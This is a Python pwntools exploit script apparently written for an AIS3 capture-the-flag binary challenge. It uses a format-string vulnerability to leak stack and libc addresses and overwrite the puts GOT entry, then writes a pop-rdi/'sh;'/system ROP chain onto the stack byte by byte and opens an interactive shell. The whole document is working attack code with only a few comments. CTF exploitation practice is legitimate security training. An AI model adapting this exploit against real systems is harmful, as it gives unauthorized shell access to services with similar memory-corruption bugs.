#!/usr/bin/env python2
from pwn import *
import time
context.arch = 'amd64'
r = remote('localhost', 4000)
#r = remote('srv01.ctf.ais3.org', 5521)
libc = ELF('libc.so.6')

puts_got = 0x601018
printf_got = 0x601028
pop_rdi = 0x400723

r.sendline('%1630c%11$hn<%38$lx><%41$lx>%3000c'.ljust(0x28, 'A')+p64(puts_got))

r.recvuntil('<')
rsp = int(r.recvuntil('>')[:-1], 16) - 0x1f0
ret = rsp + 0x110 + 0x8
r.recvuntil('<')
libc_base = int(r.recvuntil('>')[:-1], 16) - 240 - libc.symbols['__libc_start_main']
system = libc_base + libc.symbols['system']
r.recv()

print 'libc_base:', hex(libc_base)
print 'rsp:', hex(rsp)
print 'ret:', hex(ret)

j = 1

# write pop_rdi
for i in range(7,-1,-1):
    h = hex(pop_rdi)[2:].rjust(16, '0')
    print h
    s = str(int(h[i*2:i*2+2], 16))
    print s
    if s == '0':
        s = ''
    else:
        s = '%' + s + 'c'
    r.sendline((s+'%'+str(j+11)+'$hhn').ljust(0x28, 'A')+p64(ret + 7-i))
    j += 1

# write '/bin/sh;' address
for i in range(7,-1,-1):
    h = hex(rsp+0x28)[2:].rjust(16, '0')
    print h
    s = str(int(h[i*2:i*2+2], 16))
    print s
    if s == '0':
        s = ''
    else:
        s = '%' + s + 'c'
    r.sendline((s+'%'+str(j+11)+'$hhn').ljust(0x28, 'A')+p64(ret + 0x8 + 7-i))
    j += 1

# write system
for i in range(7,-1,-1):
    h = hex(system)[2:].rjust(16, '0')
    print h
    s = str(int(h[i*2:i*2+2], 16))
    print s
    if s == '0':
        s = ''
    else:
        s = '%' + s + 'c'
    r.sendline((s+'%'+str(j+11)+'$hhn').ljust(0x28, 'A')+p64(ret + 0x10 + 7-i))
    j += 1


# because high address of $rsp + 8 * (j+11) have been corrupted by 64-bit address (ret),
# puts_got must be wrote to another address
r.sendline(('%1270c%'+str(j+11+1)+'$hn').ljust(0x28, 'A')+'sh;#####'+p64(puts_got))
# /bin/sh -> sh: 1: Syntax error: EOF in backquote substitution
r.recv()


r.interactive()
